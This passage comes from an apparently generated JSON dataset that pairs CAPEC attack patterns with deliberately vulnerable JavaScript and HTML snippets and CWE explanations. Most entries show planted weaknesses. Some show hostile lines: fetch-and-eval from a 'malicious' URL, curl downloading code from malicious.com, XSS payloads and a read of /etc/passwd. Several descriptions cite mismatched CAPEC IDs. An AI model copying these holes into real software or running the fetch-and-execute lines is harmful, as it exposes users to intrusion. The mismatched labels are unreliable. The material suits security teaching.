        "description": "This JavaScript code snippet demonstrates several vulnerabilities that align with the concept of reverse engineering (CAPEC-189). The `encrypt` function uses a weak cryptographic algorithm (DES) with a hardcoded password, making it susceptible to attacks (CWE-327). The `getSystemInfo` function exposes sensitive system information, which could be leveraged by an attacker (CWE-497). The `undocumentedFeature` function represents an undocumented feature that could be exploited (CWE-1242). The `main` function ties these elements together, showing how an attacker could reverse engineer the code to discover and exploit these vulnerabilities."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "function authenticate(userInput) {\n  const secretToken = 's3cr3t';\n  let powerConsumption = 0;\n\n  for (let i = 0; i < userInput.length; i++) {\n    if (userInput[i] === secretToken[i]) {\n      powerConsumption += 10; // Simulate power consumption for correct character\n    } else {\n      powerConsumption += 5; // Simulate power consumption for incorrect character\n    }\n  }\n\n  if (userInput === secretToken) {\n    console.log('Authentication successful');\n  } else {\n    console.log('Authentication failed');\n  }\n\n  return powerConsumption;\n}\n\n// Example usage\nconst userInput = 's3cr3t';\nconst power = authenticate(userInput);\nconsole.log('Power consumption:', power);",
        "description": "This JavaScript code snippet simulates an authentication function that compares a user input with a secret token. The function also simulates power consumption based on the correctness of each character in the input. This embodies the main idea of CAPEC-163 (Black Box Reverse Engineering) by allowing an adversary to infer the secret token through power side-channel analysis (CWE-1255). The code also demonstrates observable discrepancies (CWE-203) by providing different power consumption values for correct and incorrect characters, which can be exploited to reverse engineer the secret token. Additionally, the code does not protect against physical side channels (CWE-1300), exposing sensitive information through power consumption patterns."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\n// Hidden functionality: Undocumented backdoor\nfunction hiddenBackdoor(req, res) {\n  if (req.url === '/hidden' && req.method === 'GET') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Hidden functionality accessed');\n  }\n}\n\n// Download code without integrity check\nfunction downloadAndExecute(url) {\n  http.get(url, (response) => {\n    let data = '';\n    response.on('data', (chunk) => { data += chunk; });\n    response.on('end', () => {\n      eval(data); // Dangerous: executing downloaded code without integrity check\n    });\n  });\n}\n\n// Expose sensitive system information\nfunction exposeSensitiveInfo(req, res) {\n  if (req.url === '/sensitive' && req.method === 'GET') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Sensitive Info: ${process.env.SENSITIVE_INFO}`); // Exposing sensitive info\n  }\n}\n\nconst server = http.createServer((req, res) => {\n  hiddenBackdoor(req, res);\n  exposeSensitiveInfo(req, res);\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n  // Example of downloading and executing code without integrity check\n  downloadAndExecute('http://example.com/malicious.js');\n});",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC description of reverse engineering an executable to expose hidden functionality. The code includes a hidden backdoor that can be accessed via a specific URL, which is not documented or part of the specification (CWE-912). It also shows the download and execution of code from a remote location without verifying its integrity (CWE-494), which can lead to the execution of malicious code (CWE-506). Additionally, the code exposes sensitive system information to unauthorized users (CWE-497). This snippet embodies the main idea of the CAPEC by illustrating how hidden and undocumented functionalities, along with improper handling of sensitive information and code integrity, can be exploited by attackers."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "const SECRET_KEY = 'hardcoded_secret_key_123';\n\nfunction authenticate(user, password) {\n  const storedPassword = 'hardcoded_password';\n  if (password === storedPassword) {\n    console.log('Authentication successful');\n    return true;\n  } else {\n    console.log('Authentication failed');\n    return false;\n  }\n}\n\nfunction encryptData(data) {\n  // Simple XOR encryption for demonstration purposes\n  let encrypted = '';\n  for (let i = 0; i < data.length; i++) {\n    encrypted += String.fromCharCode(data.charCodeAt(i) ^ SECRET_KEY.charCodeAt(i % SECRET_KEY.length));\n  }\n  return encrypted;\n}\n\nconst sensitiveData = 'Sensitive Information';\nconst encryptedData = encryptData(sensitiveData);\nconsole.log('Encrypted Data:', encryptedData);",
        "description": "This JavaScript code snippet demonstrates the CAPEC concept of 'Read Sensitive Constants Within an Executable' by including hard-coded sensitive constants such as a secret key and a password. The `SECRET_KEY` and `storedPassword` are hard-coded into the script, making them vulnerable to discovery through static or dynamic analysis. The `authenticate` function uses a hard-coded password for user authentication, and the `encryptData` function uses a hard-coded secret key for a simple XOR encryption. This code embodies several related CWEs: CWE-798 (Use of Hard-coded Credentials), CWE-547 (Use of Hard-coded, Security-relevant Constants), and CWE-318 (Cleartext Storage of Sensitive Information in Executable). The presence of these hard-coded values in the executable makes it easier for an adversary to extract and misuse them."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n    console.log('Connected');\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    client.write('username=admin&password=admin123');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    client.destroy(); // kill client after server's response\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a basic TCP client that connects to a server on localhost at port 8080. Upon connection, it sends sensitive information (username and password) in cleartext. This embodies the main idea of CAPEC-272 (Protocol Analysis) by showing how an adversary could easily intercept and analyze the cleartext transmission of sensitive data (CWE-319). The code does not use any encryption, making it vulnerable to eavesdropping and protocol analysis attacks."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const filePath = queryObject.file;\n\n  if (filePath) {\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/plain'});\n        res.write('File not found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/html'});\n        res.write(data);\n      }\n      res.end();\n    });\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.write('No file specified');\n    res.end();\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js that reads and serves files based on a 'file' query parameter in the URL. The server parses the URL to extract the 'file' parameter and attempts to read the specified file from the filesystem. If the file exists, it is served with a 'text/html' content type; otherwise, a 404 error is returned. This code is vulnerable to Local File Inclusion (LFI) attacks, where an attacker can specify any file path, potentially accessing sensitive files on the server. This vulnerability is similar to the PHP Remote File Inclusion described in the CAPEC, where improper control of file paths can lead to arbitrary code execution or information disclosure."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Middleware to parse JSON bodies\napp.use(express.json());\n\n// Vulnerable endpoint\napp.post('/submit', (req, res) => {\n  const { userId, data } = req.body;\n  \n  // Improper authentication: No verification of userId\n  console.log(`Received data from user: ${userId}`);\n  \n  // Process the data (potentially sensitive operation)\n  // ...\n  \n  res.send('Data received');\n});\n\napp.listen(port, () => {\n  console.log(`Server running on port ${port}`);\n});",
        "description": "This JavaScript code snippet sets up an Express server with a POST endpoint '/submit'. The endpoint accepts JSON data containing a 'userId' and 'data'. The code logs the 'userId' without any form of authentication or verification, embodying the 'Fake the Source of Data' CAPEC. This lack of proper authentication (CWE-287) and verification of the source of the communication (CWE-940) allows an adversary to submit data under a falsified identity, potentially leading to privilege escalation or data manipulation. The code demonstrates how improper handling of user identity can lead to security vulnerabilities."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Middleware to simulate weak authentication\napp.use((req, res, next) => {\n  const user = req.headers['x-user'];\n  if (user) {\n    req.user = user; // Trusting the user header without verification\n  }\n  next();\n});\n\n// Endpoint that returns user information\napp.get('/user-info', (req, res) => {\n  if (req.user) {\n    res.send(`User info for ${req.user}`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Server running on port ${port}`);\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that demonstrates a Principal Spoof vulnerability. The middleware function simulates weak authentication by trusting the 'x-user' header without verifying its authenticity (CWE-1390: Weak Authentication). An attacker can spoof the 'x-user' header to impersonate another user (CAPEC: Principal Spoof). The '/user-info' endpoint returns user information based on the unverified 'x-user' header, which can lead to unauthorized access to sensitive information (CWE-290: Authentication Bypass by Spoofing). This example highlights the importance of proper authentication mechanisms to prevent identity spoofing attacks."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak session token generation\nfunction generateSessionToken(userId) {\n  const weakSecret = '12345'; // CWE-1391: Use of Weak Credentials\n  const token = crypto.createHmac('sha256', weakSecret)\n                      .update(userId + Date.now().toString())\n                      .digest('hex');\n  return token;\n}\n\n// Simulate session fixation vulnerability\nfunction authenticateUser(userId, sessionToken) {\n  const existingSessionToken = getSessionTokenFromDatabase(userId);\n  if (existingSessionToken) {\n    // CWE-384: Session Fixation\n    return existingSessionToken;\n  }\n  const newToken = generateSessionToken(userId);\n  saveSessionTokenToDatabase(userId, newToken);\n  return newToken;\n}\n\n// Simulate insufficient session expiration\nfunction isSessionValid(sessionToken) {\n  const sessionCreationTime = getSessionCreationTime(sessionToken);\n  const currentTime = Date.now();\n  const sessionDuration = 24 * 60 * 60 * 1000; // 24 hours\n  if (currentTime - sessionCreationTime > sessionDuration) {\n    // CWE-613: Insufficient Session Expiration\n    return false;\n  }\n  return true;\n}\n\n// Simulate unprotected transport of credentials\nfunction login(username, password) {\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'http://example.com/login', true); // CWE-523: Unprotected Transport of Credentials\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send(`username=${username}&password=${password}`);\n}\n\n// Mock functions for database operations\nfunction getSessionTokenFromDatabase(userId) { /* ... */ }\nfunction saveSessionTokenToDatabase(userId, token) { /* ... */ }\nfunction getSessionCreationTime(sessionToken) { /* ... */ }",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to session credential falsification through forging. The `generateSessionToken` function uses a weak secret (CWE-1391) to create session tokens, making them predictable. The `authenticateUser` function simulates a session fixation vulnerability (CWE-384) by reusing existing session tokens without invalidating them. The `isSessionValid` function demonstrates insufficient session expiration (CWE-613) by allowing sessions to last for 24 hours. The `login` function shows unprotected transport of credentials (CWE-523) by sending login information over an unencrypted HTTP connection. These vulnerabilities collectively illustrate how an attacker could forge session credentials to gain unauthorized access."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "function expandData(data, depth) {\n  if (depth === 0) return data;\n  let expandedData = '';\n  for (let i = 0; i < 10; i++) {\n    expandedData += expandData(data, depth - 1);\n  }\n  return expandedData;\n}\n\n// Example usage\nlet initialData = 'A';\nlet depth = 5; // This will cause exponential growth\nlet result = expandData(initialData, depth);\nconsole.log(result.length);",
        "description": "This JavaScript code snippet demonstrates the concept of Exponential Data Expansion (CAPEC-230). The `expandData` function recursively expands the input data by a factor of 10 at each level of recursion. The `depth` parameter controls the level of recursion, and even a small depth value can lead to an exponential increase in the size of the output data. This can cause excessive demands on memory and CPU resources, illustrating CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-776 (Improper Restriction of Recursive Entity References in DTDs). The example usage shows how a small initial data and a moderate depth can result in a very large output, highlighting the potential for resource exhaustion."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "<script>\n  // Simulate a malformed request to a web server\n  var malformedRequest = '/error?msg=<script>alert(\"XSS Attack!\")</script>';\n\n  // Function to simulate server response with an error page\n  function simulateServerResponse(request) {\n    // Simulate improper neutralization of input in error message\n    var errorMessage = 'Error: ' + request.split('msg=')[1];\n    document.write(errorMessage); // Vulnerable to XSS\n  }\n\n  // Trigger the simulated server response\n  simulateServerResponse(malformedRequest);\n</script>",
        "description": "This JavaScript code snippet demonstrates a Cross-Site Scripting (XSS) attack targeting error pages. The 'malformedRequest' variable simulates a request to a web server that includes a script tag as part of the query string. The 'simulateServerResponse' function mimics the server's behavior by improperly handling the input and directly writing it to the error page without proper neutralization. This results in the execution of the embedded script, which in this case triggers an alert box. The code highlights vulnerabilities such as improper neutralization of script in error messages (CWE-81), improper neutralization of input during web page generation (CWE-79), and basic XSS issues (CWE-80)."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<body>\n\n<h2>Search</h2>\n<form action=\"/search\" method=\"GET\">\n  <input type=\"text\" id=\"query\" name=\"query\">\n  <input type=\"submit\" value=\"Search\">\n</form>\n\n<script>\n  const urlParams = new URLSearchParams(window.location.search);\n  const query = urlParams.get('query');\n  if (query) {\n    document.write(\"<div>Search results for: \" + query + \"</div>\");\n  }\n</script>\n\n</body>\n</html>",
        "description": "This JavaScript code snippet demonstrates a basic search form that takes user input and displays it on the page. The vulnerability lies in the improper neutralization of user input, which can lead to XSS attacks. Specifically, the code does not sanitize the 'query' parameter, allowing an attacker to inject malicious scripts using alternate syntax (e.g., 'ScRiPt' instead of 'script'). This can bypass incomplete denylist-based protections and execute unauthorized scripts. The code highlights the risks associated with improper input validation and neutralization, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to remove input filters\napp.use((req, res, next) => {\n  // Intentionally bypassing input validation\n  next();\n});\n\napp.post('/submit', (req, res) => {\n  const userInput = req.body.userInput;\n  // Directly using user input without validation or sanitization\n  eval(userInput); // CWE-74: Injection vulnerability\n  res.send('Input processed');\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable Express.js application where input filters are intentionally removed, leading to several security weaknesses. The middleware function bypasses any input validation, allowing potentially malicious data to be processed. In the '/submit' route, user input is directly used in an 'eval' function without any validation or sanitization, which is a classic example of an injection vulnerability (CWE-74). This code embodies the main idea of the CAPEC by showing how the removal of input filters can lead to severe security issues, such as improper input validation (CWE-20), incomplete list of disallowed inputs (CWE-184), and improper neutralization (CWE-707)."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "const fs = require('fs');\nconst yaml = require('js-yaml');\n\n// Load YAML file with external reference\nconst data = fs.readFileSync('data.yaml', 'utf8');\n\ntry {\n  // Parse YAML data without validating external references\n  const doc = yaml.load(data);\n  console.log(doc);\n} catch (e) {\n  console.error(e);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to 'Serialized Data External Linking' (CAPEC). The code reads a YAML file ('data.yaml') and parses it using the 'js-yaml' library. The key issue here is that the YAML file may contain external references, and the parser does not validate these references. This can lead to the inclusion of external data or functionality from untrusted sources (CWE-829), improper handling of XML external entities (CWE-611), and potential deserialization of untrusted data (CWE-502). The code highlights the risk of processing serialized data without proper validation, which can be exploited by an adversary to access sensitive information or execute arbitrary code."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1234, '127.0.0.1', () => {\n    console.log('Connected to server');\n    // Bypassing client-side authentication\n    client.write(JSON.stringify({ action: 'authenticate', token: 'malicious_token' }));\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // Injecting malicious code\n    if (data.toString().includes('authenticated')) {\n        client.write(JSON.stringify({ action: 'createResource', resourceName: 'maliciousResource' }));\n    }\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a malicious client application that connects to a server and violates the server's assumptions about client behavior. The client bypasses client-side authentication by sending a fake token and then injects malicious code to create an unauthorized resource on the server. This embodies the CAPEC 'Create Malicious Client' and incorporates related CWEs such as 'Client-Side Enforcement of Server-Side Security' (CWE-602), 'Embedded Malicious Code' (CWE-506), and 'Use of Client-Side Authentication' (CWE-603). The code highlights how an attacker can exploit client-side vulnerabilities to compromise server security."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "const fs = require('fs');\nconst registryPath = '/path/to/registry/file';\n\n// CWE-314: Cleartext Storage in the Registry\nlet sensitiveData = 'userPassword123';\nfs.writeFileSync(registryPath, sensitiveData, 'utf8');\n\n// CWE-15: External Control of System or Configuration Setting\nfunction modifyRegistry(newData) {\n  fs.writeFileSync(registryPath, newData, 'utf8');\n}\n\n// CWE-1231: Improper Prevention of Lock Bit Modification\nlet lockBit = false;\nfunction setLockBit() {\n  lockBit = true;\n}\nfunction modifyRegistryWithLock(newData) {\n  if (!lockBit) {\n    fs.writeFileSync(registryPath, newData, 'utf8');\n  } else {\n    console.log('Registry is locked. Modification not allowed.');\n  }\n}\n\n// Example usage\nmodifyRegistry('newSensitiveData'); // Modifies registry without any lock\nsetLockBit();\nmodifyRegistryWithLock('anotherSensitiveData'); // Will not modify due to lock",
        "description": "This JavaScript code snippet demonstrates the manipulation of registry information, embodying the main idea of the CAPEC. It includes vulnerabilities related to the CWEs mentioned. The code stores sensitive information in cleartext (CWE-314) and allows external control of system settings (CWE-15). It also shows an attempt to prevent modification using a lock bit (CWE-1231), but the lock bit can be set or unset, demonstrating improper prevention of lock bit modification. The code represents how an adversary could exploit these weaknesses to manipulate registry information."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "const sensitiveData = 'user_password';\n\n// Store sensitive data in local storage (cache)\nlocalStorage.setItem('cachedPassword', sensitiveData);\n\n// Retrieve sensitive data from local storage\nconst retrievedData = localStorage.getItem('cachedPassword');\nconsole.log('Retrieved Data:', retrievedData);",
        "description": "This JavaScript code snippet demonstrates the vulnerability described in the CAPEC by storing sensitive information (a user's password) in the browser's local storage, which acts as a cache. The code then retrieves and logs this sensitive data. This example embodies CWE-524 (Use of Cache Containing Sensitive Information) and CWE-525 (Use of Web Browser Cache Containing Sensitive Information) by showing how sensitive data can be stored in a cache that can be accessed by an attacker. The lack of encryption (CWE-311) and improper handling of sensitive data in the cache can lead to its exposure."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "const credentials = { username: 'admin', password: 'password123' }; \n\nfunction authenticate() { \n  if (credentials.username === 'admin' && credentials.password === 'password123') { \n    console.log('Authentication successful'); \n  } else { \n    console.log('Authentication failed'); \n  } \n} \n\nauthenticate();",
        "description": "This JavaScript code snippet demonstrates a vulnerable approach to handling authentication by embedding credentials directly within the client-side code. The `credentials` object contains hardcoded sensitive data (username and password), which can be easily extracted by an attacker. The `authenticate` function checks these hardcoded credentials to grant access. This embodies the main idea of CAPEC-37 (Retrieve Embedded Sensitive Data) and highlights CWE-522 (Insufficiently Protected Credentials) and CWE-603 (Use of Client-Side Authentication). The code is vulnerable because it stores sensitive data insecurely and performs authentication on the client side, making it susceptible to unauthorized access and modification."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\n// CWE-798: Hard-coded credentials\nconst signingKey = 'hardcoded-signing-key';\n\n// CWE-732: Incorrect permission assignment\nfs.chmodSync('signingKey.pem', 0o777); // Insecure permission\n\n// CWE-494: Download code without integrity check\nconst maliciousCodeUrl = 'http://malicious.com/maliciousCode.js';\nconst maliciousCode = require('child_process').execSync(`curl -s ${maliciousCodeUrl}`).toString();\n\n// Sign the malicious code\nconst sign = crypto.createSign('SHA256');\nsign.update(maliciousCode);\nsign.end();\nconst signature = sign.sign(signingKey, 'hex');\n\n// CWE-506: Embedded malicious code\nfs.writeFileSync('maliciousCode.js', `${maliciousCode}\n// Signature: ${signature}`);\n\nconsole.log('Malicious code signed and saved as maliciousCode.js');",
        "description": "This JavaScript code snippet demonstrates the concept of 'Signing Malicious Code' by using hard-coded credentials (CWE-798) to sign a piece of malicious code downloaded without an integrity check (CWE-494). The signing key is stored with insecure permissions (CWE-732), making it easily accessible. The code then signs the malicious code and embeds the signature within it (CWE-506). This represents how an adversary could use extracted signing credentials to sign and distribute malicious code, misleading users into believing it is legitimate."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "function authenticateUser(username, password) {\n  // Client-side authentication (CWE-603)\n  if (username === 'admin' && password === 'password123') {\n    return true;\n  }\n  return false;\n}\n\nfunction accessProtectedResource() {\n  // Client-side enforcement of server-side security (CWE-602)\n  if (authenticateUser(prompt('Username:'), prompt('Password:'))) {\n    alert('Access granted to protected resource.');\n  } else {\n    alert('Access denied.');\n  }\n}\n\n// Removing important client functionality (CAPEC-Removing Important Client Functionality)\n// An attacker can bypass the authentication by modifying the client-side code\naccessProtectedResource();",
        "description": "This JavaScript code snippet demonstrates a scenario where client-side authentication and security enforcement are implemented. The `authenticateUser` function checks the username and password on the client side (CWE-603), and the `accessProtectedResource` function relies on this client-side check to grant access to a protected resource (CWE-602). An attacker can easily bypass this security mechanism by modifying the client-side code, such as removing or altering the `authenticateUser` function, thus removing important client functionality that the server assumes to be present and trustworthy. This embodies the main idea of the CAPEC by showing how client-side security mechanisms can be disabled or bypassed, leading to potential vulnerabilities."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "function calculateTotalCost(price, quantity) {\n  // Client-side calculation of total cost\n  return price * quantity;\n}\n\n// Example usage\nlet price = 100; // Price per item\nlet quantity = 5; // Number of items\n\n// Attacker modifies the quantity to exploit the vulnerability\nquantity = 1; // Incorrect quantity set by attacker\n\nlet totalCost = calculateTotalCost(price, quantity);\n\n// Send the manipulated total cost to the server\nconsole.log('Total Cost:', totalCost);",
        "description": "This JavaScript code snippet demonstrates a vulnerable client-side calculation of the total cost of items. The function `calculateTotalCost` takes the price per item and the quantity of items as input and returns the total cost. In a real-world scenario, the server might rely on the client to perform this calculation and send the result back. However, an attacker can manipulate the quantity variable to a lower value, resulting in an incorrect total cost being sent to the server. This embodies the main idea of the CAPEC, where the attacker removes or modifies the logic on the client side to send incorrect monetary information to the server. The related CWEs highlight the issues of relying on client-side enforcement, incorrect calculations, and improper validation of input quantities."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "<html>\n<head>\n    <title>Test Page</title>\n</head>\n<body>\n    <h1>Welcome to the Test Page</h1>\n    <img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA\n    AAAFCAYAAACNbyblAAAAHElEQVQI12P4\n    //8/w38GIAXDIBKE0DHxgljNBAAO\n    9TXL0Y4OHwAAAABJRU5ErkJggg==\" onerror=\"alert('XSS')\">\n</body>\n</html>",
        "description": "This HTML snippet demonstrates a Cross-Site Scripting (XSS) attack using MIME type mismatch. The image tag's 'src' attribute is set to a base64-encoded PNG image. However, the 'onerror' attribute contains JavaScript code that will execute if the image fails to load. This leverages CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page) and CWE-84 (Improper Neutralization of Encoded URI Schemes in a Web Page). If a browser incorrectly handles the MIME type and executes the script, it can lead to XSS, demonstrating the vulnerability described in the CAPEC."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "document.querySelectorAll('img').forEach(img => {\n  img.src = 'javascript:alert(\"XSS\")';\n});\n\n// Example of an exposed ActiveX control\nvar unsafeControl = new ActiveXObject('UnsafeControl');\nunsafeControl.dangerousMethod();",
        "description": "This JavaScript code snippet demonstrates the deprecated attack pattern of leveraging web tools to change application behavior. The first part of the code iterates over all IMG tags on a web page and sets their 'src' attribute to a JavaScript alert, which is a common XSS attack vector (CWE-82). The second part of the code shows the creation of an ActiveX object and calls a dangerous method on it, representing an exposed unsafe ActiveX method (CWE-618). This snippet embodies the idea of manipulating web application behavior through client-side scripting, which can lead to various security vulnerabilities."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "const fs = require('fs');\n\n// Function to read a file and return its contents\nfunction readFile(filePath) {\n  return fs.readFileSync(filePath, 'utf8');\n}\n\n// Function to log sensitive system information\nfunction logSystemInfo() {\n  const sensitiveInfo = readFile('/etc/passwd'); // Sensitive file\n  console.log(sensitiveInfo);\n}\n\n// Function to handle user input and misuse functionality\nfunction handleUserInput(input) {\n  if (input === 'logInfo') {\n    logSystemInfo(); // Misuse of functionality to expose sensitive information\n  } else {\n    console.log('Invalid input');\n  }\n}\n\n// Simulate user input\nhandleUserInput('logInfo');",
        "description": "This JavaScript code snippet demonstrates a misuse of functionality by leveraging legitimate capabilities of the application to achieve a negative technical impact. The `readFile` function reads the contents of a file, and the `logSystemInfo` function logs sensitive system information from the '/etc/passwd' file. The `handleUserInput` function takes user input and, if the input is 'logInfo', it calls `logSystemInfo`, thereby exposing sensitive information. This represents the CAPEC concept of 'Functionality Misuse' by using the application's legitimate file reading capability in an unintended way to access and expose sensitive data. The code also touches on CWE-497 by exposing sensitive system information to an unauthorized control sphere."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  let filePath = path.join(__dirname, 'public', req.url);\n\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('404 Not Found');\n      res.end();\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.write(data);\n      res.end();\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from the 'public' directory based on the URL requested by the client. However, it is vulnerable to path traversal attacks because it directly uses the 'req.url' input to construct the file path without proper validation or sanitization. An attacker could exploit this by sending requests with sequences like '/../' or '....' to access files outside the intended directory, potentially leading to unauthorized access to sensitive files on the server."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  try {\n    // Simulate processing request\n    if (req.url === '/error') {\n      throw new Error('Simulated server error');\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Hello, world!');\n  } catch (err) {\n    // Misconfiguration: Missing custom error page\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(err.stack); // Exposing stack trace\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server processes incoming requests and intentionally throws an error when the URL is '/error'. The error is caught in a try-catch block, but instead of displaying a custom error page, the server responds with the stack trace of the error. This exposes sensitive information about the server's internals, which can be exploited by attackers for application mapping. This example embodies the deprecated CAPEC pattern of using fuzzing to garner stack traces and highlights the related CWE-7 (J2EE Misconfiguration: Missing Custom Error Page) by not providing a custom error page and exposing the stack trace directly."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  try {\n    // Simulate processing request\n    if (Math.random() < 0.5) {\n      throw new Error('Random error occurred');\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Request processed successfully');\n  } catch (err) {\n    // Log error with sensitive information\n    console.error(`Error: ${err.message}, Stack: ${err.stack}`);\n    // Send error response with sensitive information\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(`Internal Server Error: ${err.message}`);\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://127.0.0.1:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server processes incoming requests and randomly throws an error to simulate unexpected behavior. When an error occurs, it logs the error message and stack trace, which may contain sensitive information, to the console. Additionally, it sends an error response back to the client, including the error message. This demonstrates the concept of 'Fuzzing for application mapping' by showing how an attacker could send random requests to trigger errors and gain insights from the application's error messages and logs. The code also highlights related CWEs, such as the generation of error messages containing sensitive information (CWE-209) and the insertion of sensitive information into log files (CWE-532)."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Missing authentication for critical function (CWE-306)\n    console.log('Received data:', data.toString());\n    // Improper enforcement of message integrity (CWE-924)\n    // Improper verification of source (CWE-940)\n    // Channel accessible by non-endpoint (CWE-300)\n    // Covert channel (CWE-514)\n    socket.write('Data received');\n  });\n});\n\nserver.listen(8080, '127.0.0.1');\nconsole.log('Server listening on port 8080');",
